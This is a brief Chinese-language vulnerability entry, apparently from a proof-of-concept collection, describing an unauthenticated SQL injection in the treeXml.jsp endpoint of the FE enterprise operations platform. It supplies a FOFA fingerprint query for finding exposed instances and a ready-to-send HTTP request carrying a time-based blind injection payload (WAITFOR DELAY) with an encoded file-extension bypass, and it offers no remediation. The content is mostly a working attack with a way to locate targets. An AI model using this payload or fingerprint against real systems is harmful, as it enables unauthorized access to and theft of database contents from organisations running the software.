## 飞企互联-FE企业运营管理平台treeXml.jsp存在SQL注入漏洞

飞企互联-FE企业运营管理平台 treeXml.jsp 接口存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息。

## fofa

```
app="FE-协作平台"
```

## poc

```
GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:5'--&type=function HTTP/1.1 
Host: your-ip
```

![image-20240605095623810](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406050956915.png)